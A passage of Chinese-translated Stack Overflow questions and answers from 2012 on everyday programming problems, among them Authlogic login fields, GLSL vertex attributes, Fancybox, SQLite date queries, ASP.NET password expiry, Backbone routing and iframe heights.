    DEFAULT_ANALYSIS      = :all
    DEFAULT_OUTPUT_FORMAT = :xml
    DEFAULT_SCORING       = :standard
    DEFAULT_SOURCE_URL    = nil
    DEFAULT_INPUT_TEXT    = nil

    attr_accessor *VALID_CONFIG_KEYS
  ....
 end 
```

这是来自这个存储库： [OpenAmplify](https://github.com/gregmoreno/openamplify/blob/master/lib/openamplify/configuration.rb)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T17:24:18.563

首先，在***configuration.rb***和***client.rb***中，它们使用相同的命名空间，即**模块 OpenAmplify**。

尽管 client.rb 中不需要 configuration.rb，但 Ruby 项目的约定通常要求将所有必要的文件放在一个文件中（通常与命名空间同名，并放在 {ProjectName}/lib/ 中，在这种情况下文件是***openamplify/lib/openamplify.rb***）。

所以如果你去***openamplify/lib/openamplify.rb***，你会注意到它实际上需要所有这两个文件：

```
require 'openamplify/configuration'
require 'openamplify/client' 
```

由于常量已经在***configuration.rb***中定义：

```
module OpenAmplify
  module Configuration
    VALID_CONFIG_KEYS = ...
  end
end 
```

然后显然常量 VALID_CONFIG_KEYS 在同一模块中（由 client.rb 重新打开***）***通过 Configuration::VALID_CONFIG_KEYS 可见（并且前面的 * 仅表示爆炸数组，因为 VALID_CONFIG_KEYS 是符号数组）

```
module OpenAmplify
  class Client
    attr_accessor *Configuration::VALID_CONFIG_KEYS
  end
end 
```

# ruby-on-rails - Rails Authlogic：使用数据库 ID 登录

> ID：11917654
> 
> 赞同：0
> 
> 时间：2012-08-11T21:05:42.683
> 
> 标签：ruby-on-rails, authentication, ruby-on-rails-3.2, authlogic

我是 Rails (3.2) 的新手，我正在寻找一种允许用户使用他们的数据库 ID 和密码登录的方法。阅读文档，Authlogic 似乎允许使用登录名或电子邮件登录。是否有可能以某种方式扩展 gem 以允许用户通过提供他们的数据库 ID 和密码来进行身份验证？

这是我当前的用户模型

```
class User < ActiveRecord::Base
attr_accessible :password, :password_confirmation, :current_login_ip, :email, :failed_login_count, :first_name, :last_login_ip, :last_name, :last_request_at, :login_count, :password_salt,
              :perishable_token, :persistence_token, :single_access_token

acts_as_authentic
end 
```

还有我当前的用户会话模型

```
class UserSessionsController < ApplicationController

  def new
    @user_session = UserSession.new
  end

  def create
    @user_session = UserSession.new(params[:user_session])
    if @user_session.save
      flash[:notice] = "Successfully logged in."
      redirect_to root_url
    else
      render :action => 'new'
    end
  end

  def destroy
    if UserSession.find
      UserSession.find.destroy
      flash[:notice] = "Successfully logged out."
    end

    redirect_to root_url
  end
end 
```

我当前的设置使用电子邮件地址身份验证。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T19:28:35.403

Authlogic 允许您选择要用作登录字段的列。查看 [Login::Config 模块](https://github.com/binarylogic/authlogic/blob/master/lib/authlogic/acts_as_authentic/login.rb)（`login_field`选项）：

```
acts_as_authentic do |c|
  c.login_field = :database_id_or_whatever_fits_your_needs
end 
```

# macos - GLSL 示例在 mac 上不起作用

> ID：11917662
> 
> 赞同：2
> 
> 时间：2012-08-11T21:07:39.113
> 
> 标签：macos, cocoa, opengl, glsl, nsopenglview

我正在尝试在 Mac 上创建一个 GLSL 示例。我正在尝试为每个顶点设置一个颜色属性。但是，当程序运行时，我只是得到一个紫色的屏幕（紫色来自 glClearColor）。我发布了相关的代码片段。

```
-(void)drawRect:(NSRect)dirtyRect
{    
    // get program ID for shader program
    GLuint programID = [self loadShaders];

    // get new dimensions
    NSSize dim = [self frame].size;

    // clear the background with color
    glClearColor(0.4f, 0.1f, 0.7f, 1.0f);
    glDepthRange(1.0, -1.0);
    glViewport(0, 0, dim.width, dim.height);
    glClear(GL_COLOR_BUFFER_BIT);

    // generate a buffer for our triangle
    glGenBuffers(2, vertexBuffer);

    glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer[0]);
    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);
    glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer[1]);
    glBufferData(GL_ARRAY_BUFFER, sizeof(colors), colors, GL_STATIC_DRAW);

    glUseProgram(programID);

    glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer[0]);
    glEnableVertexAttribArray(0);
    glVertexAttribPointer(VERTEX_POS_INDEX, VERTEX_POS_SIZE, GL_FLOAT, GL_FALSE, VERTEX_POS_SIZE*sizeof(vertices), vertices);

    glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer[1]);
    glEnableVertexAttribArray(1);
    glVertexAttribPointer(VERTEX_COLOR_INDEX, VERTEX_COLOR_SIZE, GL_FLOAT, GL_FALSE, VERTEX_POS_SIZE*sizeof(colors), colors);

    glDrawArrays(GL_TRIANGLES, 0, 3);

    glDisableVertexAttribArray(0);
    glDisableVertexAttribArray(1);
    glUseProgram(0);

    // flush buffer
    glFlush();
    [[self openGLContext] flushBuffer];
} 
```

然后加载阴影代码：

```
-(GLuint)loadShaders
{
    printf("GLSL version %s\n", glGetString(GL_SHADING_LANGUAGE_VERSION));
    printf("GL Version: %s", glGetString(GL_VERSION));

    // Create the shaders
    GLuint vertexShaderID = glCreateShader(GL_VERTEX_SHADER);
    GLuint fragmentShaderID = glCreateShader(GL_FRAGMENT_SHADER);

    // get handle for app bundle
    NSBundle *appBundle = [NSBundle mainBundle];

    // get the path for the vertex shader file
    NSString *vertexFilePath = [appBundle pathForResource:vertexShaderFile ofType:nil];
    // get the path for the fragment shader file
    NSString *fragmentFilePath = [appBundle pathForResource:fragmentShaderFile ofType:nil];

    // get the contents of the vertex shader file into a string
    NSString *vertexFileContents = [NSString stringWithContentsOfFile:vertexFilePath encoding:NSUTF8StringEncoding error:NULL];
    NSLog(@"%@", vertexFileContents);
    // get the contents of the fragment shader file into a string
    NSString *fragmentFileContents = [NSString stringWithContentsOfFile:fragmentFilePath encoding:NSUTF8StringEncoding error:NULL];
    NSLog(@"%@", fragmentFileContents);

    GLint Result = GL_FALSE;
    int infoLogLength;

    // get a pointer the vertex shader program source, compile shader program
    const char *vertexSourcePointer = [vertexFileContents UTF8String];
    glShaderSource(vertexShaderID, 1, &vertexSourcePointer, NULL);
    glCompileShader(vertexShaderID);
    // check the vertex shader
    glGetShaderiv(vertexShaderID, GL_COMPILE_STATUS, &Result);
    glGetShaderiv(vertexShaderID, GL_INFO_LOG_LENGTH, &infoLogLength);
    char vertexShaderErrorMessage[infoLogLength];
    glGetShaderInfoLog(vertexShaderID, infoLogLength, NULL, vertexShaderErrorMessage);
    // print error message
    NSLog(@"%@", [NSString stringWithUTF8String:vertexShaderErrorMessage]);

    // get a pointer to the fragment shader program source, compile shader program
    const char *fragmentSourcePointer = [fragmentFileContents UTF8String];
    glShaderSource(fragmentShaderID, 1, &fragmentSourcePointer, NULL);
    glCompileShader(fragmentShaderID);
    // check the fragment shader
    glGetShaderiv(fragmentShaderID, GL_COMPILE_STATUS, &Result);
    glGetShaderiv(fragmentShaderID, GL_INFO_LOG_LENGTH, &infoLogLength);
    char fragmentShaderErrorMessage[infoLogLength];
    glGetShaderInfoLog(fragmentShaderID, infoLogLength, NULL, fragmentShaderErrorMessage);
    // print error message
    NSLog(@"%@", [NSString stringWithUTF8String:fragmentShaderErrorMessage]);

    // link the program
    NSLog(@"Linking program...");
    GLuint programID = glCreateProgram();
    glAttachShader(programID, vertexShaderID);
    glAttachShader(programID, fragmentShaderID);

    glBindAttribLocation(programID, 0, "position");
    glBindAttribLocation(programID, 1, "inColor");

    glLinkProgram(programID);

    // check the program
    glGetProgramiv(programID, GL_LINK_STATUS, &Result);
    glGetProgramiv(programID, GL_INFO_LOG_LENGTH, &infoLogLength);
    char shaderProgramErrorMessage[max(infoLogLength, (int)1)];
    glGetProgramInfoLog(programID, infoLogLength, NULL, shaderProgramErrorMessage);
    // pring error message
    NSLog(@"%@", [NSString stringWithUTF8String:shaderProgramErrorMessage]);

    // delete shaders
    glDeleteShader(vertexShaderID);
    glDeleteShader(fragmentShaderID);

    return programID;

} 
```

最后是着色器：

```
#version 120

attribute vec4 position;
attribute vec4 inColor;
varying vec4 outColor;
void main()
{
    gl_Position = position;
    outColor = inColor;
} 
```

和

```
#version 120

varying vec4 outColor;
void main()
{
    gl_FragColor = outColor;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:32:07.867

看起来相当不错，虽然我确实看到了一个错误。

```
glBindBuffer(GL_ARRAY_BUFFER, vertexBuffer[0]);
glEnableVertexAttribArray(0);
glVertexAttribPointer(VERTEX_POS_INDEX, 
                      VERTEX_POS_SIZE, 
                      GL_FLOAT, 
                      GL_FALSE, 
                      VERTEX_POS_SIZE*sizeof(vertices), 
                      vertices); 
```

如果您使用 VBO，则 glVertexAttribPointer 的最终属性应该是从当前绑定缓冲区开始的**偏移量。**

如果您使用的是顶点数组（没有 glBindBuffer），那么您将使用 glVertexAttribPointer 的最后一个参数指向顶点。

但是，由于您已经上传`vertices`到缓冲区并绑定它，glVertexAttribPointer 的最终值应该是从顶点缓冲区开始的**偏移量**，在您的情况下，应该是`0`.

颜色缓冲区也有同样的错误。

# jquery - Fancybox 关闭重新加载 div

> ID：11917664
> 
> 赞同：0
> 
> 时间：2012-08-11T21:07:42.090
> 
> 标签：jquery, fancybox

如果我关闭 Fancybox，我只想重新加载一个 div 而不是整个页面......我已经阅读了很多关于同样问题的帖子，但任何人都有一个可行的解决方案。

有任何想法吗 ？

谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:11:24.827

在`onClosed`事件[http://fancybox.net/api](http://fancybox.net/api)你可以重新加载 div

```
$("#div").load("/url/to/reload"); 
```

或者

```
 $("#div").html("refreshed content"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-05-20T09:57:31.753

在指定 Fancybox 显示参数后使用 Fancybox on afterClose 函数。

你的分区：

```
 <div id="tree-image" class="tree-list-image"><a id="inline" href="PATH TO 
 YOUR 
 IMAGE" data-caption="YOUR IMAGE TITLE"><img src="PATH TO YOUR IMAGE" 
 alt="THIS IS AN IMAGE"/></a></div> 
```

Fancybox 脚本函数：

```
<script type="text/javascript">
$(document).ready(function() {
/* This is basic - uses default settings */

$("a#inline").fancybox({
'opacity' : 0.4,
'autoSize' : true,      
'transitionIn'  :   'elastic',
'transitionOut' :   'elastic',
'speedIn'       :   100, 
'speedOut'      :   200, 
'overlayShow'   :   false,
'hideOnContentClick': true,
         afterClose : function( instance, current ) {
            $('#tree-image').load(document.URL +  ' #tree-image');

        }
});
});
</script> 
```

你也可以使用 -->

```
window.location.reload(true); 
```

在 afterClose 函数中。

当我说我不明白为什么任何一个或选项总是有效时，我是诚实的。我总是先尝试一个然后另一个，在大多数情况下我很幸运。我想这与您使用的 jQuery 版本有关。

Sometimes when I use fancybox to open a dialog, I use the same function to redirect to another page after fancybox is closed.

You can see a demo of the above on [https://treeco.co.za/our-trees/](https://treeco.co.za/our-trees/)

# c++ - 简单的模块系统（回调）

> ID：11917666
> 
> 赞同：0
> 
> 时间：2012-08-11T21:07:55.403
> 
> 标签：c++

我正在尝试制作一个简单的模块引擎，但我真的不知道从哪里开始，我想创建这样的东西：

```
int awesomefunction() {
 // do something here
    execute_awesomefunction_callbacks_here();
 // some more stuff
} 
```

*execute_awesomefunction_callbacks_here();* 将执行 std::vector 中的所有函数

关于如何实现这一目标的任何想法？或者有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:11:46.090

`std::vector`您可以使用of来实现它`std::function`。唯一的约束是所有函数对象必须具有兼容的返回类型和参数类型。

```
class Publisher {

 public:
  void registerSubscriber(std::function<int(int, double)> callback) {
    callbacks_.push_back(callback);
  int executeAwesomeFunction() const {
    // loop over vector calling each function object.
  }
 private:
  std::vector<std::function<double(int,double)>> callbacks_;
} 
```

这需要 C++11 支持，但您可以使用[boost::function实现相同的功能](http://www.boost.org/doc/libs/1_50_0/doc/html/function.html)

# android - 使用包含“/”的字符串查询数据库

> ID：11917668
> 
> 赞同：1
> 
> 时间：2012-08-11T21:08:07.153
> 
> 标签：android, sqlite

我以我的数据库格式“MM/dd/yyyy”存储日期，我想按特定日期进行查询，但是当我进行查询时，光标什么也不返回。

是因为字符串中的“/”还是其他原因？是的，我知道日期已正确存储在数据库中

```
@Override
public Loader<Cursor> onCreateLoader(int arg0, Bundle arg1) {
        return new CursorLoader(getActivity(),Games.GAMES_URI,new String[] {Games.GAMES_ID},Games.GAMES_DATE + "="+dt,
                null,null);
} 
```

转换日期

```
public convertDate(Calendar date){
        mDate = date;           
        Date d = new Date(date.getTimeInMillis());
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy");
        dt = df.format(d);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:18:22.997

您尝试执行的查询将如下所示：

```
... WHERE games_date=08/11/2012 
```

它需要在哪里：

```
... WHERE games_date="08/11/2012" 
```

（假设这`games_date`是列的名称——根据需要替换）

尝试`Games.GAMES_DATE + "=?"`你的第四个`CursorLoader`构造函数参数和`{dt}`你的第五个`CursorLoader`构造函数参数，Android/SQLite 会在需要的地方自动为你添加引号，假设你`ContentProvider`是由 SQLite 支持的。

此外，您可能会考虑以其他格式存储您的日期。如果您希望它是一个字符串，`yyyy-MM-dd`(or `yyyy/MM/dd`) 是一个更好的选择，因为它会按时间顺序正确排序。如果您不需要它是一个字符串，只需存储`getTimeInMillis()`在一个`INTEGER`列中就可以更容易地与`Date`对象进行转换，而不会弄乱字符串转换。

# asp.net - ASP.Net 每 90 天更改一次密码以帮助 PCIDSS

> ID：11917672
> 
> 赞同：1
> 
> 时间：2012-08-11T21:08:33.390
> 
> 标签：asp.net, asp.net-mvc, pci-dss

我正在完成 PCIDSS 评估。

要求状态密码必须至少每 90 天更改一次，并且与之前的 4 个密码中的任何一个都不同。

我不确定这是为了访问服务器，还是为了访问我提供给服务器上用户的应用程序。

如果是后者 - 无论如何在 ASP.Net 3.5/4 Web 应用程序和 MVC4 Web 应用程序中强制执行此操作？

谢谢，马克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:04:48.803

这是内部申请吗？如果是这样，请考虑与 LDAP/Active Directory 集成（假设正在用于您的网络密码）。然后可以处理密码规则（即跟踪以前使用过的内容，确保密码足够复杂且与以前的密码不同并强制更改频率）。这也意味着您的用户不必记住/保持同步多个密码，他们会感谢您的。

[http://msdn.microsoft.com/en-us/library/ms180890(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms180890(v=vs.80).aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T10:43:40.527

对于您的第一个要求，Asp.Net Membership 有一个属性[MembershipUser.LastPasswordChangedDate](http://msdn.microsoft.com/en-us/library/system.web.security.membershipuser.lastpasswordchangeddate.aspx)然后您可以像这样挂钩到您的登录名：

```
 if (Membership.ValidateUser(userName, password))
        {
            MembershipUser theUser = Membership.GetUser(userName);
            if (theUser.LastPasswordChangedDate.Date.AddDays(90) < DateTime.Now.Date)
            {
                // Inform user password expired + redirect user to change password screen
            }
            FormsAuthentication.SetAuthCookie(userName, rememberMe);
        } 
```

您需要自己实现第二个要求（即不能与最后 4 个密码相同）。根据建议，创建一个`UserPasswordHistory`外键返回 aspnet_User.UserId 的新表，其中包含密码散列，每次用户更改他/她的密码时都会插入该散列。然后，您可以将新密码的哈希值与前 4 个进行比较并相应地拒绝。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:57:18.177

您可以将密码连同创建日期一起保存在另一个表中。这将是相当简单的

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-10-29T09:23:07.950

'我不确定这是为了访问服务器，还是为了访问我在服务器上提供给用户的应用程序。

通常PCIDSS专注于服务器，所以..这是对服务器的访问。

# c# - 更新xml中的记录

> ID：11917675
> 
> 赞同：0
> 
> 时间：2012-08-11T21:08:52.630
> 
> 标签：c#, xml, linq-to-xml

这样我可以获得记录的详细信息，我想知道如何编辑值并将其更新到同一记录？

如何检查属性中的唯一值？

```
XDocument doc = XDocument.Load(filePath);

string id = textBox6.Text;
XElement element = doc.Descendants("Customer").FirstOrDefault(p => p.Attribute("id").Value == id);

if (element != null)
{
    //found
    textBox6.Text = textBox6.Text;
    textBox1.Text = (string)element.Element("FirstName");
    textBox2.Text = (string)element.Element("LastName"); 
    textBox3.Text = (string)element.Element("Mobile");
    textBox4.Text = (string)element.Element("Address");
    textBox5.Text = (string)element.Element("Country");
} 
```

示例 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<CustomerRecord>
  <Customer id="43543543">
    <FirstName>sdf</FirstName>
    <LastName>fdsf</LastName>
    <Mobile>23452345é</Mobile>
    <Address>zfdsf</Address>
    <Country>dsfdsf</Country>
  </Customer>
</CustomerRecord> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:11:13.190

例如，我只使用 2 个子节点（名字，姓氏）。我将file.xml与exe文件放在同一目录中，这是代码：

```
using System;
using System.Windows.Forms;
using System.Xml;

namespace UpdateXmlRecord
{
    public partial class Form1 : Form
    {
        private XmlDocument xDoc;

        public Form1()
        {
            InitializeComponent();
            xDoc = new XmlDocument();
            xDoc.Load("file.xml");
        }

        /// <summary>
        /// Retrieve Xml Node
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button1_Click(object sender, EventArgs e)
        {
            string id = txtId.Text;
            string fName = "", lName = "";
            foreach (XmlElement element in xDoc.DocumentElement)
            {
                if (element.Name == "Customer" && element.Attributes["id"].Value == id)
                {
                    foreach (XmlNode node in element)
                    {
                        if (node.Name == "FirstName")
                        {
                            fName = node.InnerText;
                        }

                        if (node.Name == "LastName")
                        {
                            lName = node.InnerText;
                        }
                    }
                }
            }

            txtFName.Text = fName;
            txtLName.Text = lName;
        }

        /// <summary>
        /// Save Xml Node With Custom Value
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void button2_Click(object sender, EventArgs e)
        {
            string id = txtId.Text;
            foreach (XmlElement element in xDoc.DocumentElement)
            {
                if (element.Name == "Customer" && element.Attributes["id"].Value == id)
                {
                    foreach (XmlNode node in element)
                    {
                        if (node.Name == "FirstName")
                        {
                            node.InnerText = txtFName.Text;
                        }

                        if (node.Name == "LastName")
                        {
                            node.InnerText = txtLName.Text;
                        }
                    }
                }
            }
            xDoc.Save("file.xml");
        }
    }
} 
```

希望对您有所帮助，享受它。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:20:27.937

```
XElement element;
XDocument doc;

private void Load()
{
    doc = XDocument.Load(filePath);

    string id = textBox6.Text;
    element = doc.Descendants("Customer").FirstOrDefault(p => p.Attribute("id").Value == id);

    if (element != null)
    {
        //found
        textBox6.Text = textBox6.Text;
        textBox1.Text = (string)element.Element("FirstName");
        textBox2.Text = (string)element.Element("LastName"); 
        textBox3.Text = (string)element.Element("Mobile");
        textBox4.Text = (string)element.Element("Address");
        textBox5.Text = (string)element.Element("Country");
    }
}

protected void btnSave_Click(object sender, EventArgs e)
{
    element.Attribute("id").Value = textBoxID.text;
    var firstNameSimilarElement = doc.Descendants("FirstName").FirstOrDefault(fn => fn.Value == textBox1.Text)
    if (firstNameSimilarElement != null && firstNameSimilarElement.Parent != element)
    {
         MessageBox.Show("First Name already exists");
    }
    else
    {
        element.Element("FirstName").Value = textBox1.Text;
    }
    // Same for all fields
    doc.Save(filePath);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:16:46.327

您可以散列节点的内容并将散列附加到生成的 XML。散列将是唯一的，足以充当您记录的“主键”。

# c++ - 在 Eclipse 中保存时自动编译目标文件

> ID：11917676
> 
> 赞同：0
> 
> 时间：2012-08-11T21:09:13.027
> 
> 标签：c++, eclipse, compiler-construction

在 Eclipse 中，当我保存代码文件时，有没有办法为保存的文件编译目标文件，然后在我运行或调试时将它们链接在一起？这是带有 GCC 的 Linux 上的 C++。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-03T01:51:52.363

我不这么认为。在 Eclipse CDT 中，构建过程是显式启动的。我认为“自动构建”选项用于 Java 和 Eclipse 知道如何构建的其他语言。C++ 项目通常使用某种 make 实用程序构建。您可以自定义您的 make 文件以设置不同的构建目标，以提高性能并减少构建/编译时间。

# backbone.js - 如何使用 Backbone 创建带有参数的自定义 GET url？

> ID：11917679
> 
> 赞同：3
> 
> 时间：2012-08-11T21:09:18.830
> 
> 标签：backbone.js

我注意到一些网站提供 Ajax-ian 搜索来刷新 URL 并显示使用的 GET 参数，例如：

> someapp.com/search/Tokyo?price_min=80&price_max=300

*作为 Ajax GET 请求的结果。*

我想知道如何通过使用**Backbone.js**来实现这一点，我知道通过使用主干的*推送状态*这可能是可能的，对吗？

**例如，我如何为 Place 模型定义这样的路线（假设相同的情况，范围为 /search）？**

我会在哪里做这个？在路由器或模型中？

我感谢有关此主题的所有答案。我提前为没有提供任何代码道歉，我通常这样做，但这个练习将是我想做的概念证明，我希望骨干是这项工作的正确工具。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-12T21:57:11.397

这是解决方案的一个工作示例 - [jsfiddle.net/avrelian/dGr8Y/](http://jsfiddle.net/avrelian/dGr8Y/)，除了 jsFiddle 不允许`Backbone.history.navigate`方法正常运行。

假设，我们有一个按钮

```
<input class="fetch-button" type="button" value="Fetch" />​ 
```

和一个处理程序

```
$('.fetch-button').click(function() {
  Backbone.history.navigate('posts/?author=martin', true);
}); 
```

这是我们收集的帖子

```
var Posts = Backbone.Collection.extend({
    url: 'api/posts'
}); 
```

这是我们的带有自定义参数提取器的路由器

```
var Router = Backbone.Router.extend({
    routes: {
        'posts/?:filters': 'filterPosts'
    },
    filterPosts: function(filters){
        posts.fetch({data: $.param(filters)});
    },
    _extractParameters: function(route, fragment) {
        var result = route.exec(fragment).slice(1);
        result.unshift(deparam(result[result.length-1]));
        return result.slice(0,-1);
    }
}); 
```

它是简化的 $.deparam 模拟。你可以用你自己的来代替。

```
var deparam = function(paramString){
    var result = {};
    if( ! paramString){
        return result;
    }
    $.each(paramString.split('&'), function(index, value){
        if(value){
            var param = value.split('=');
            result[param[0]] = param[1];
        }
    });
    return result;
}; 
```

最后，帖子集合和路由器对象的实例化

```
var posts = new Posts;

var router = new Router;
Backbone.history.start(); 
```

当用户点击按钮时，地址栏变为`myapp.com/s/#posts?author=martin`. 请注意标志`#`。我们使用哈希查询字符串。当然，您可以使用`push state`，但它尚未普及。

# java - 在 java 中使用具有枚举类型的元组作为 HashMaps 的键

> ID：11917684
> 
> 赞同：2
> 
> 时间：2012-08-11T21:10:18.960
> 
> 标签：java, enums, hashmap

这基本上是我想要做的：

```
enum Animal { CAT, FISH }
enum color { RED, GREEN }
int weight = 10
int IQ = 200
AnimalPrice.put((Animal.CAT, Color.GREEN, weight,IQ) , 5) 
```

也就是说，一只重 10 磅、智商为 200 的绿猫的价格是 5 美元。有没有办法在java中做到这一点？我只使用整数列表作为键，但没有使用枚举类型

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:17:45.847

我会考虑两种方法：

1 创建键作为这 4 个值的字符串连接

```
String key = Animal.CAT + '_' + Color.GREEN + '_' + weight + '_' + IQ; 
```

2 创建一个由这些值组成的对象并创建一个自定义的 equals 和 hashCode 方法

```
public class AnimalPriceKey {
  private Animal animal;
  private Color color;
  private int weight;
  private int iq;

  public AnimalPriceKey(Animal animal, Color color, int weight, int iq) {
    this.animal = animal;
    this.color = color;
    this.weight = weight;
    this.iq = iq;
  }

  @Override
  public int hashCode() {
    final int prime = 31;
    int result = 1;
    result = prime * result + ((animal == null) ? 0 : animal.hashCode());
    result = prime * result + ((color == null) ? 0 : color.hashCode());
    result = prime * result + iq;
    result = prime * result + weight;
    return result;
  }

  @Override
  public boolean equals(Object obj) {
    if (this == obj)
      return true;
    if (obj == null)
      return false;
    if (getClass() != obj.getClass())
      return false;
    AnimalPriceKey other = (AnimalPriceKey) obj;
    if (animal != other.animal)
      return false;
    if (color != other.color)
      return false;
    if (iq != other.iq)
      return false;
    if (weight != other.weight)
      return false;
    return true;
  }
} 
```

我会赞成第二种方法，因为它更加健壮和面向未来。

使用示例：

```
Map<AnimalPriceKey, Integer> animalPrices = new HashMap<AnimalPriceKey, Integer>();
animalPrices.put(new AnimalPriceKey(Animal.CAT, Color.GREEN, 10, 200), 5); 
```

# php - CakePHP 模型关联，例如“Facebook Likes”

> ID：11917686
> 
> 赞同：0
> 
> 时间：2012-08-11T21:10:24.287
> 
> 标签：php, cakephp, facebook-like, models, model-associations

我尝试用 CakePHP 做一些最好描述的事情，比如 Facebook 的“点赞”。我有四个表：用户、喜欢、帖子和图片。用户可以喜欢一个帖子或一张图片，而我尝试对这两种可能性只点赞一种。

我还想在 Controller 中使用尽可能少的代码。

是否有“本机”CakePHP 方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:16:44.407

您可能会查看[CakeDC“收藏夹”插件](https://github.com/CakeDC/favorites)。

除此之外，在 CakePHP 中没有“喜欢”某些东西的内置方法。但是使用 CakePHP 来做这件事变得非常简单。

（这不是人们只发布“操作方法”代码的地方。如果您发布您已经尝试过的内容，或者到目前为止您的想法，我们当然可以提供帮助并为您指明正确的方向或位置你做错了……等等）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-11T23:59:47.103

Cake PHP 将原生地为按照他们期望的方式设计的表创建视图。在这种情况下，您可能应该有 2 个“喜欢”表，因为您的外键将链接到不同的表。

例如： Likes_Posts : user_id, post_id
Likes_Pictures : user_id, picture_id

通过这种方式，您可以创建一个显示所有喜欢的用户视图。CakePHP 将能够使用 Bake 自动执行此操作。如果您尝试对 2 个不同的表使用一个字段外键，您会混淆 CakePHP（可能还有您自己！）。希望这可以帮助...

# wordpress - 如何从我的源代码中隐藏 WordPress？

> ID：11917688
> 
> 赞同：0
> 
> 时间：2012-08-11T21:10:50.193
> 
> 标签：wordpress

我可以隐藏wordpress页面的html + javascript代码吗？我的意思是当任何人点击查看源时，他/她将无法知道该网站是使用 WordPress 开发的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:20:10.350

无法阻止用户查看网站的来源。Web 浏览器需要能够呈现它，因此任何形式的“加密”都会导致浏览器无法呈现页面。

[网上有这样](http://htmlobfuscator.com/)的 HTML 混淆工具。但是您将无法在 WordPress 中使用它们，因为它会即时生成所有 HTML。

与其隐藏您正在使用 WordPress 的事实，我建议您确保您的 WP 安装保持最新，并使用合理的安全插件，例如[Bulletproof Security](http://wordpress.org/extend/plugins/bulletproof-security/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:24:18.517

如果您只是想`<meta name="generator" content="WordPress 3.4.1" />`从生成的 HTML 中删除标签，可以将其添加到主题的`functions.php`.

```
remove_action('wp_head', 'wp_generator'); 
```

如果您想删除页脚文本中的“Powered by WordPress”，这将取决于您使用的主题。一些主题允许您从仪表板自定义页脚文本，其他主题则需要在`footer.php`.

不过，您使用 WordPress 可能仍然很明显。内部上传文件的大量引用`wp-content`将可见，并且许多类名将带有`wp-`前缀。如果不破坏您的网站，您可能无法更改这些内容。

通常，您无法阻止用户查看您网站的源代码。HTML 定义了您网站的标记和内容，浏览器只是呈现它。你能做的最好的事情就是以这样的方式混淆它，你不能轻易地分辨出每个 HTML 元素代表什么或每个 JavaScript 函数做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:12:58.830

不，这是不可能的。因为浏览器必须以纯文本形式呈现它，所以总是可以看到它。

查看 JavaScript 混淆以使您的代码更难重用或理解：[如何混淆（保护）JavaScript？](https://stackoverflow.com/questions/194397/how-can-i-obfuscate-javascript)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-16T22:30:17.173

我相信您想要做的是隐藏您的网站由 WordPress 提供支持的事实。为此，您可以尝试此处提供的建议： **[如何从源代码中隐藏 WordPress 信息](http://pythoughts.com/how-to-hide-that-you-use-wordpress/)**

# css - 无法控制 iframe 高度

> ID：11917690
> 
> 赞同：0
> 
> 时间：2012-08-11T21:11:09.820
> 
> 标签：css, iframe, height

我在 iframe 的高度上遇到了一个奇怪的问题。

在它的父页面中，我们设置它的高度 = 900px，像这样：

```
 <html lang="en-us">
    <head>
       <?php  include_once "./includes/header.php"; ?>
    </head>
    <body>
       <?php include_once "./includes/top.php" ?>
       <?php include_once "./includes/left_nav.php" ?>
       <section id="content">
       <iframe width="100%"  height="900" id="myFrame" src="./modules/ophthalmology/patients.php" scrolling="no" frameborder="0">
       </iframe>
       </section>
       <?php include_once "./includes/footer.php" ?>
     </body>
     </html> 
```

但它不能显示里面的所有内容。我通过萤火虫检查了元素，然后发现：

```
 <iframe id="myFrame" width="100%" scrolling="no" height="208" frameborder="0" src="./modules/ophthalmology/patients.php"> 
```

高度更改为 208。

但在另一个模块中，它的源代码：

```
 <html lang="en-us">
    <head>
       <?php  include_once "./includes/header.php"; ?>
    </head>
    <body>
       <?php include_once "./includes/top.php" ?>
       <?php include_once "./includes/left_nav.php" ?>
       <section id="content">
       <iframe width="100%"  height="900" id="myFrame" src="./modules/csvfileupload/index.html" scrolling="no" frameborder="0">
       </iframe>
       </section>
       <?php include_once "./includes/footer.php" ?>
     </body>
     </html> 
```

它改为：

```
 <iframe id="myFrame" width="100%" scrolling="no" height="930" frameborder="0" src="./modules/csvfileupload/index.html"> 
```

这两者唯一的不同就是src文件不同，第一个是patients.php，第二个是index.html。所有其他人都是一样的。

我检查了内容的元素，它是css：

```
 #content {
       border: 1px solid;
       border-bottom-left-radius: 4px;
       border-bottom-right-radius: 4px;
       margin: 0;
       min-height: 600px;
       overflow: visible;
